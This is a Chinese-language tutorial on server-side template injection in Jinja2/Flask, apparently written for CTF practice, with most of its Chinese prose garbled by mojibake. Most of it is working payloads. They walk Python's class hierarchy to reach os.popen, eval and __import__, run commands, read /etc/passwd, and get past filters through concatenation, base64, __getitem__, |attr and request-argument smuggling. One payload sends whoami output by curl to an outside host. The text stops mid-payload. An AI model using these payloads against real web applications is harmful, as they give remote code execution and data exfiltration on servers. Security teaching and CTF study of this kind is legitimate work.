æˆåŠŸå®šä½å…¶ä½ç½®ï¼Œå¤„äºæ»´414å·ä½ç½® {{\"\".__class__.__mro__[1].__subclasses__()[414]}} ç„¶åæˆ‘ä»¬ä¸ºè¯¥å‡½æ•°ä¼ é€’å‚æ•°è°ƒç”¨å³å¯ {{\"\".__class__.__mro__[1].__subclasses__()[414](\"ls\",shell=True,stdout=-1).communicate()}} æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶ï¼Œå‘ç°flag.txt Popen.communicate() ä¸è¿›ç¨‹äº¤äº’ï¼šå°†æ•°æ®å‘é€åˆ°æ ‡å‡†è¾“å…¥ã€‚ä» stdout å’Œ stderr è¯»å–æ•°æ®ï¼Œç›´åˆ°åˆ°è¾¾æ–‡ä»¶ç»“å°¾ ä¹‹åæˆ‘ä»¬ç›´æ¥catä»–å°±çœ‹è§å•¦~~~~ {{\"\".__class__.__mro__[1].__subclasses__()[414](\"cat flag.txt\",shell=True,stdout=-1).communicate()}} å‰©ä¸‹çš„æœªå®æ“è¿‡ exp2 è¿™é‡Œæˆ‘ä»¬è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨å…¨å±€ä¸‹çš„å†…ç½®æ¨¡å—å¼•ç”¨__builtins__ï¼ˆæŒ‡å‘__builtin__ï¼‰ åœ¨Pythonä¸­ï¼Œæœ‰ä¸€ä¸ªå†…å»ºæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¸­æœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°;è€Œè¯¥æ¨¡å—åœ¨Pythonå¯åŠ¨åã€ä¸”æ²¡æœ‰æ‰§è¡Œç¨‹åºå‘˜æ‰€å†™çš„ä»»ä½•ä»£ç å‰ï¼ŒPythonä¼šé¦–å…ˆåŠ è½½ è¯¥å†…å»ºå‡½æ•°åˆ°å†…å­˜ {{\"\".__class__.__bases__[0].__subclasses__()[1500].__init__.__globals__['__builtins__']['__import__'](\"os\").popen(\"cat flag.txt\").read()}} åŒæ ·ï¼Œæˆ‘ä»¬è·å–åŸºæœ¬ç±»åï¼Œç»§ç»­å‘ä¸‹è·å–åŸºæœ¬ç±»(object)çš„å­ç±»ï¼Œç„¶åinitåˆå§‹åŒ–ç±»ï¼Œglobalså…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡å’Œå‚æ•°å¹¶æŸ¥çœ‹å…¶å†…å»ºæ¨¡å—çš„å¼•ç”¨ ä½¿ç”¨å†…å»ºæ¨¡å—ä¸­çš„__import__å¼•å…¥osåº“ï¼Œå¹¶é€‚ç”¨å…¶ä¸­çš„popenå‡½æ•°è¯»å–flag.txtå³å¯ æ³¨æ„ï¼š è¯¥expä¸­ï¼Œå¯¹å­ç±»çš„é€‰æ‹©subclasses()[1500]æ—¶ï¼Œç»æµ‹è¯•å¤§å¤šæ•°å­ç±»ä¸­éƒ½åŒ…å«å†…å»ºæ¨¡å—çš„å¼•ç”¨ï¼Œä½†ä¾æ—§æœ‰ä¸å°‘ä¸åŒ…å«ï¼Œè¦æ³¨æ„ æˆ‘ä»¬ä½¿ç”¨burpå°†å­ç±»çš„é€‰æ‹©åŠ ä¸ºå‚æ•°è¿›è¡Œçˆ†ç ´ éå†å‡ºï¼ˆä»¥ä¸‹æˆªå›¾ä¸­Payloadçš„å­ç±»å·éƒ½å¯ä»¥å¼•ç”¨ï¼Œå…·æœ‰**__builtins__**ï¼‰ ä»¥ä¸‹ä¸ºä¸å¯ä»¥ä½¿ç”¨çš„ï¼ˆç”±æ­¤å¯çœ‹å‡ºå·å¾€å¤§äº†å†™å°±å¯¹äº†~ï¼‰ 4. SSTIåˆ©ç”¨æ€è·¯ å…ˆä¸ŠPayloadï¼š {{''.__class__.__base__.__subclasses__()[1].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()')}} ä¸‹é¢åˆ†æ­¥å¯¹æ¯ä¸€æ­¥ä»£ç è¿›è¡Œåˆ†æï¼š 1.é¦–å…ˆè€ƒè™‘æ‹¿åˆ°ä¸€ä¸ªclassï¼Œé€šè¿‡å­—ç¬¦ä¸²ã€å…ƒç»„ã€åˆ—è¡¨ã€å­—å…¸å‡å¯ã€‚ {{''.__class__}} # &lt;class 'str'&gt; {{().__class__}} # &lt;type 'tuple'&gt; {{[].__class__}} # &lt;type 'list'&gt; {{{}.__class__}} # &lt;type 'dict'&gt; 2.ä¸‹ä¸€æ­¥ç›®çš„æ˜¯æ‹¿åˆ°objectåŸºç±»ã€‚ {{''.__class__.__base__}} # &lt;class 'object'&gt; 3.ç„¶åè·å–å¯¹åº”å­ç±»ã€‚ {{''.__class__.__base__.__subclasses__()}} # [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, ... 4.åœ¨æ‰€æœ‰çš„å­ç±»ä¸­é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„ç±»ï¼Œå»è·å–__globals__å…¨å±€å˜é‡ã€‚å¦‚æœè¿™äº›å‡½æ•°å¹¶æ²¡æœ‰è¢«é‡è½½ï¼Œè¿™æ—¶ä»–ä»¬å¹¶ä¸æ˜¯functionï¼Œä¸å…·æœ‰__globals__å±æ€§ã€‚ {{''.__class__.__base__.__subclasses__()[128]}} # &lt;class 'os._wrap_close'&gt; 5.é€šè¿‡æŸäº›æ‰‹æ®µæ‰¾åˆ°æŸä¸ªå‡½æ•°æ˜¯å¯ç”¨çš„ï¼Œä¸‹ä¸€æ­¥åˆ©ç”¨è¿™ä¸ªç±»çš„__init__å‡½æ•°è·å–åˆ°__globals__å…¨å±€å˜é‡ã€‚ {{''.__class__.__base__.__subclasses__()[128].__init__}} # &lt;function _wrap_close.__init__ at 0x00000221629F5048&gt; {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__}} # ..., 'eval': &lt;built-in function eval&gt;, ... 6.å†è·å–åˆ°__globals__å…¨å±€å˜é‡é‡Œçš„__builtins__ä¸­çš„evalå‡½æ•°ã€‚ {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']}} # {'__name__': 'builtins', '__doc__': ... {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']}} # &lt;built-in function eval&gt; 7.ä½¿ç”¨popenå‘½ä»¤æ‰§è¡Œå³å¯ã€‚ {{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')}} # root 2.3 å¸¸ç”¨ç±» å…ˆä¸¾å‡ ä¸ªåŸºç¡€çš„ä¾‹å­æ–¹ä¾¿ç†è§£ï¼š 1ã€class __class__ç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»ï¼Œæ ¼å¼ä¸ºå˜é‡.class &gt;&gt;&gt; ''.__class__ &lt;class 'str'&gt; &gt;&gt;&gt; ().__class__ &lt;class 'tuple'&gt; &gt;&gt;&gt; {}.__class__ &lt;class 'dict'&gt; &gt;&gt;&gt; [].__class__ &lt;class 'list'&gt; 2ã€bases __bases__ç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œæ³¨æ„æ˜¯ç±»çš„åŸºç±»ï¼Œæ‰€ä»¥æ ¼å¼ä¸ºå˜é‡.class.bases &gt;&gt;&gt; ''.__class__.__bases__ (&lt;class 'object'&gt;,) &gt;&gt;&gt; ().__class__.__bases__ (&lt;class 'object'&gt;,) &gt;&gt;&gt; {}.__class__.__bases__ (&lt;class 'object'&gt;,) &gt;&gt;&gt; [].__class__.__bases__ (&lt;class 'object'&gt;,) åŒæ—¶ä¹Ÿèƒ½åŠ ä¸Šæ•°ç»„ï¼Œæ¯”å¦‚å˜é‡.class.bases[0]æ¥è·å¾—ç¬¬ä¸€ä¸ªåŸºç±»ã€‚ å€¼å¾—ä¸€æçš„æ˜¯è¿˜æœ‰ä¸ªç±»æ˜¯__mro__ï¼Œå®ƒä¼šæ˜¾ç¤ºç±»å’ŒåŸºç±»ï¼Œè¿™æ˜¯å®ƒå’Œ__bases__çš„ä¸åŒã€‚ &gt;&gt;&gt; ''.__class__.__mro__ (&lt;class 'str'&gt;, &lt;class 'object'&gt;) 3ã€subclasses() subclasses()æŸ¥çœ‹å½“å‰ç±»çš„å­ç±»ï¼Œæ ¼å¼å˜é‡.class.bases[0].subclasses() è¿™ä¸ªç±»ä¹Ÿå¯ä»¥åŠ æ•°ç»„æ¥æŸ¥çœ‹æŒ‡å®šçš„ç´¢å¼•å€¼ï¼Œä¾‹å¦‚å˜é‡.class.bases[0].subclasses()[1] &gt;&gt;&gt; ''.__class__.__bases__[0].__subclasses__()[0] &lt;class 'type'&gt; è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¼€å§‹åˆ©ç”¨ç±»é‡Œé¢çš„æ–¹æ³•äº†ã€‚ ä¾‹å¦‚: å˜é‡.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__ initåˆå§‹åŒ–ç±»ï¼Œç„¶åglobalså…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°ã€‚ ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å„ç§å„æ ·çš„å‚æ•°æ–¹æ³•å‡½æ•°ï¼Œå»æ‰¾ä¸€ä¸ªå¯åˆ©ç”¨çš„functionæ¥æ‰§è¡Œï¼Œæ¯”å¦‚popençš„è¯ï¼Œå°±å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼š ''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read() å¤§æ¦‚æ˜¯è¿™ä¹ˆä¸ªåŸç†ï¼Œä½†è¿™æ ·è¯´æ¥è¿˜æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œæ¥çœ‹å‡ é“é¢˜å°±èƒ½æ›´æ·±åˆ»ç†è§£äº†ã€‚ ä¹‹åçš„é¢˜ç›®å‚è€ƒï¼šhttps://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506 é­”æœ¯å¯¹è±¡ __class__ :è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ __mro__ :è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚ __base__ \"è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» // __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ __subclasses__ è·å–å½“å‰ç±»çš„æ‰€æœ‰å­ç±» __init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³• __globals__ å¯¹åŒ…å«(ä¿å­˜)å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ ç”¨é­”æœ¯å¯¹è±¡æ„é€ ä¸€ä¸ªç®€å•çš„è¯­å¥ æˆ‘ä»¬åœ¨é‡Œé¢è¿è¡Œä»¥ä¸‹ï¼š &gt;&gt;&gt; [].__class__ &lt;class 'list'&gt; &gt;&gt;&gt; [].__class__.__base__ &lt;class 'object'&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__() &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2] &lt;class 'weakcallableproxy'&gt; &gt;&gt;&gt; è§£è¯»ä¸€ä¸‹ï¼š classè¿”å›[]æ‰€å±çš„å¯¹è±¡ï¼› class+base:è¿”å›è¿™ä¸ªå¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» class+base+subclasses:æ‰¾åˆ°äº†è¿™ä¸ªå¯¹è±¡çš„åŸºç±»ï¼Œé‚£ä¹ˆå°±è¿”å›è¿™ä¸ªåŸºç±»ä¸‹æ‰€å…·æœ‰çš„å­ç±»è¿™å°±æ˜¯ä¸€ä¸ªå…·æœ‰[]çš„å¯¹è±¡ç»§æ‰¿çš„åŸºç±»çš„æ‰€æœ‰å­ç±»ï¼Œåœ¨è¿™é‡Œé¢æˆ‘ä»¬ä¸ä¹å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬è¦ç”¨çš„å­ç±»å¦‚å‰æ–‡æ‰€æåˆ°çš„ï¼šfileã€openç­‰ç­‰ã€‚ é‚£ä¹ˆæ—¢ç„¶æˆ‘ä»¬è¦ç”¨SSTIå»åšäº›äº‹æƒ…ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦ç”¨åˆ°è¿™äº›å­ç±»å‘—ã€‚ å¦‚ä½•è°ƒç”¨è¿™äº›å­ç±»ï¼š &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2] &lt;class 'weakcallableproxy'&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[3] &lt;class 'weakproxy'&gt; &gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40] &lt;class 'wrapper_descriptor'&gt; è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨è¿™äº›å­ç±»äº† å‡å¦‚æˆ‘ä»¬è¦å»æŸ¥çœ‹æŸä¸ªç½‘é¡µè·å–flagï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨fileå‡½æ•°ï¼š(file åœ¨PT2é‡Œé¢è¿˜å¯ä»¥ä½¿ç”¨ï¼Œåœ¨PY3é‡Œé¢å·²ç»è¢«ç§»é™¤äº†) [].__class__.__base__.__subclasses__()[40]('fl4g').read() ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦å»è·å–ç›®å½•ç­‰ç­‰ï¼Œå°±éœ€è¦ç”¨åˆ°systemå‡½æ•°ï¼šè¯»å–ç›®å½•ä¸€èˆ¬æ˜¯lså‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•è°ƒç”¨ !/usr/bin/env python encoding: utf-8 num = 0 for item in ''.__class__.__mro__[2].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 å¾—åˆ°ç±»ä¸­OSæ¨¡å—çš„å‡½æ•°(71) ().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls') (os.listdir()ï¼šåˆ—å‡ºç¬¬ä¸€å±‚ç›®å½•æ–‡ä»¶ å› ä¸º71æ˜¯osåº“çš„å‡½æ•°ï¼Œæ‰€ä»¥globalsæ˜¯å¯¹è¯¥å‡½æ•°å­—å…¸çš„å¼•ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™ä¸‹å°±æ‹¿åˆ°äº†å­—å…¸ï¼Œç„¶åç´§æ¥ç€å°±æ˜¯æˆ‘ä»¬è¦ä½¿ç”¨çš„å‘½ä»¤ã€‚) æœ‰æ—¶å€™systemå‡½æ•°ä¼šè¢«è¿‡æ»¤æ‰ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨ ().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.') #è¯»å–æœ¬çº§ç›®å½• dir()ä¸__dict__ dir()æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›çš„æ˜¯listï¼› __dict__æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé”®ä¸ºå±æ€§åï¼Œå€¼ä¸ºå±æ€§å€¼ï¼› dir()è¿”å›æ‰€æœ‰çš„å±æ€§ï¼Œè€Œ__dict__è¿”å›çš„æ˜¯éçˆ¶ç±»çš„é”®ä¸å¯¹åº”çš„å€¼ã€‚ 2.4 å¸¸è§çš„playload è·å¾—åŸºç±» #python2.7 ''.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] #python3.7 ''.__ã€‚ã€‚ã€‚class__.__mro__[1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] #python 2.7 #æ–‡ä»¶æ“ä½œ #æ‰¾åˆ°fileç±» [].__class__.__bases__[0].__subclasses__()[40] #è¯»æ–‡ä»¶ [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read() #å†™æ–‡ä»¶ [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test') #å‘½ä»¤æ‰§è¡Œ #osæ‰§è¡Œ [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecacheä¸‹æœ‰osç±»ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼š [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() #eval,impoerç­‰å…¨å±€å‡½æ•° [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ä¸‹æœ‰evalï¼Œ__import__ç­‰çš„å…¨å±€å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ï¼š [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\") [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\") [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read() [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() #python3.7 #å‘½ä»¤æ‰§è¡Œ {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %} #æ–‡ä»¶æ“ä½œ {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %} #windowsä¸‹çš„oså‘½ä»¤ \"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read() 2.5 å¸¸è§çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ os.system() â€¦init__globals[â€˜osâ€™].system(â€˜lsâ€™)çš„è¾“å‡ºæ˜¯æ‰§è¡Œç»“æœçš„è¿”å›å€¼ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºï¼ŒæˆåŠŸæ‰§è¡Œè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼Œå› ä¸ºè¾“å‡ºç»“æœä¸æ˜æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¼šç”¨åˆ°ä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼š os.popen() ç”¨æ³•ï¼šos.popen(command[,mode[,bufsize]]) eg:{{().class.base.subclass__()[71].init.globlas__[â€˜osâ€™].popen(â€˜lsâ€™,â€˜râ€™).read()}} è¯´æ˜ï¼šmode â€“ æ¨¡å¼æƒé™å¯ä»¥æ˜¯ â€˜râ€™(é»˜è®¤) æˆ– â€˜wâ€™ã€‚ init.globals__[â€˜osâ€™].popen(â€˜lsâ€™,â€˜râ€™),read() popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚ ç¼ºç‚¹ï¼šPopenéå¸¸å¼ºå¤§ï¼Œæ”¯æŒå¤šç§å‚æ•°å’Œæ¨¡å¼ï¼Œé€šè¿‡å…¶æ„é€ å‡½æ•°å¯ä»¥çœ‹åˆ°æ”¯æŒå¾ˆå¤šå‚æ•°ã€‚ä½†Popenå‡½æ•°å­˜åœ¨ç¼ºé™·åœ¨äºï¼Œå®ƒæ˜¯ä¸€ä¸ªé˜»å¡çš„æ–¹æ³•ï¼Œå¦‚æœè¿è¡Œcmdå‘½ä»¤æ—¶äº§ç”Ÿå†…å®¹éå¸¸å¤šï¼Œå‡½æ•°å°±å®¹æ˜“é˜»å¡ã€‚å¦ä¸€ç‚¹ï¼ŒPopenæ–¹æ³•ä¹Ÿä¸ä¼šæ‰“å°å‡ºcmdçš„æ‰§è¡Œä¿¡æ¯ warnings.catchwarning è®¿é—®osæ¨¡å—è¿˜æœ‰ä»warnings.catchwarningsæ¨¡å—å…¥æ‰‹çš„ï¼Œè€Œè¿™ä¸¤ä¸ªæ¨¡å—åˆ†åˆ«ä½äºå…ƒç»„ä¸­çš„59ï¼Œ60å·å…ƒç´ ã€‚__init__æ–¹æ³•ç”¨äºå°†å¯¹è±¡å®ä¾‹åŒ–ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡funcglobalsï¼ˆæˆ–è€…__globalsï¼‰çœ‹è¯¥æ¨¡å—ä¸‹æœ‰å“ªäº›globalså‡½æ•°ï¼ˆæ³¨æ„è¿”å›çš„æ˜¯å­—å…¸ï¼‰ï¼Œè€Œlinecacheå¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°å¼•ç”¨äº†osæ¨¡å—ã€‚ äºæ˜¯è¿˜å¯ä»¥æŒ–æ˜åˆ°ç±»ä¼¼payloadï¼ˆæ³¨æ„payloadéƒ½ä¸æ˜¯ç›´æ¥å¥—ç”¨çš„ï¼Œä¸åŒç¯å¢ƒè¯·è‡ªè¡Œæµ‹è¯•ï¼‰ [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls') [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls') values ä½œç”¨ï¼šè¿”å›å­—å…¸ä¸­çš„æ‰€æœ‰å€¼ã€‚ ä½¿ç”¨ï¼š #!/usr/bin/python dict = {'Name': 'Zara', 'Age': 7} print \"Value : %s\" % dict.values() ä»¥ä¸Šå®ä¾‹è¾“å‡ºç»“æœä¸ºï¼š Value : [7, 'Zara'] __builtins__å†…å»ºå‡½æ•° å†…å»ºå‡½æ•°å°±æ˜¯æœ¬èº«å°±æœ‰çš„ï¼Œå¯åŠ¨çš„æ—¶å€™pythonè§£é‡Šå™¨å°±ä¼šè‡ªåŠ¨è§£æï¼Œå†…å»ºå‡½æ•°é‡Œé¢åŒ…æ‹¬äº†è®¸å¤šæˆ‘ä»¬éœ€è¦çš„evalå‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤,ä½†æ˜¯ç»å¸¸ä¼šè¢«ban å½“æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªpythonè§£é‡Šå™¨æ—¶ï¼Œå³æ—¶æ²¡æœ‰åˆ›å»ºä»»ä½•å˜é‡æˆ–è€…å‡½æ•°ï¼Œè¿˜æ˜¯ä¼šæœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå†…å»ºå‡½æ•°ã€‚ å†…å»ºå‡½æ•°å¹¶ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±åšå®šä¹‰ï¼Œè€Œæ˜¯åœ¨å¯åŠ¨pythonè§£é‡Šå™¨çš„æ—¶å€™ï¼Œå°±å·²ç»å¯¼å…¥åˆ°å†…å­˜ä¸­ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œæƒ³è¦äº†è§£è¿™é‡Œé¢çš„å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥ä»åç§°ç©ºé—´å¼€å§‹ã€‚ `__builtins__` æ–¹æ³•æ˜¯åšä¸ºé»˜è®¤åˆå§‹æ¨¡å—å‡ºç°çš„ï¼Œå¯ç”¨äºæŸ¥çœ‹å½“å‰æ‰€æœ‰å¯¼å…¥çš„å†…å»ºå‡½æ•°ã€‚ __globals__ï¼šè¯¥æ–¹æ³•ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰ä½ç½®çš„æ‰€æœ‰å…¨å±€å˜é‡ï¼Œä¸ func_globals ç­‰ä»·ã€‚è¯¥å±æ€§æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§ï¼Œè®°å½•å½“å‰æ–‡ä»¶å…¨å±€å˜é‡çš„å€¼ï¼Œå¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“ï¼Œä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ã€‚è¯¥å±æ€§ä¿å­˜çš„æ˜¯å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ã€‚ __import__()ï¼šè¯¥æ–¹æ³•ç”¨äºåŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•° ã€‚å¦‚æœä¸€ä¸ªæ¨¡å—ç»å¸¸å˜åŒ–å°±å¯ä»¥ä½¿ç”¨ __import__() æ¥åŠ¨æ€è½½å…¥ï¼Œå°±æ˜¯ importã€‚è¯­æ³•ï¼š__import__(æ¨¡å—å) è¿™æ ·æˆ‘ä»¬åœ¨è¿›è¡ŒSSTIæ³¨å…¥çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ä½¿ç”¨å¾ˆå¤šçš„ç±»å’Œæ–¹æ³•ï¼Œé€šè¿‡å­ç±»å†å»è·å–å­ç±»çš„å­ç±»ã€æ›´å¤šçš„æ–¹æ³•ï¼Œæ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„ç±»å’Œæ–¹æ³•åŠ ä»¥åˆ©ç”¨ã€‚æ€»ä¹‹ï¼Œæ˜¯é€šè¿‡pythonçš„å¯¹è±¡çš„ç»§æ‰¿æ¥ä¸€æ­¥æ­¥å®ç°æ–‡ä»¶è¯»å–å’Œå‘½ä»¤æ‰§è¡Œçš„ï¼š ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls\").read()') ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()') è¿™ä¸¤ä¸ªpayloadç”¨çš„æ˜¯åŒä¸€ä¸ªæ¨¡å—,__builtins__æ¨¡å—,evalæ–¹æ³•. [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].popen('ls').read() ç»•è¿‡ æ‹¼æ¥ object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls') ().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read() ç¼–ç  ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval'](\"__import__('os').popen('ls').read()\") ç­‰ä»·äº ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](\"X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=\".decode('base64'))(å¯ä»¥çœ‹å‡ºå•åŒå¼•å·å†…çš„éƒ½å¯ä»¥ç¼–ç ) åŒç†è¿˜å¯ä»¥è¿›è¡Œrot13ã€16è¿›åˆ¶ç¼–ç ç­‰ è¿‡æ»¤ä¸­æ‹¬å·[] getitem() \"\".__class__.__mro__[2] \"\".__class__.__mro__.__getitem__(2) pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40) ('/etc/passwd').read() è‹¥.ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°|attr() å°†request.__class__æ”¹æˆrequest|attr(\"__class__\") å­—å…¸è¯»å– __builtins__['eval']() __builtins__.eval() ç»è¿‡æµ‹è¯•è¿™ç§æ–¹æ³•åœ¨pythonè§£é‡Šå™¨é‡Œä¸èƒ½æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æµ‹è¯•çš„é¢˜ç›®ç¯å¢ƒä¸‹å¯ä»¥æ‰§è¡Œ è¿‡æ»¤åŒä¸‹åˆ’çº¿__ {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ å°†å…¶ä¸­çš„ request.args æ”¹ä¸º request.values åˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚ GET: {{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40] ('/etc/passwd').read() }} POST: class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ è¿‡æ»¤èŠ±æ‹¬å· {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %} æˆ–è€…ï¼š {% 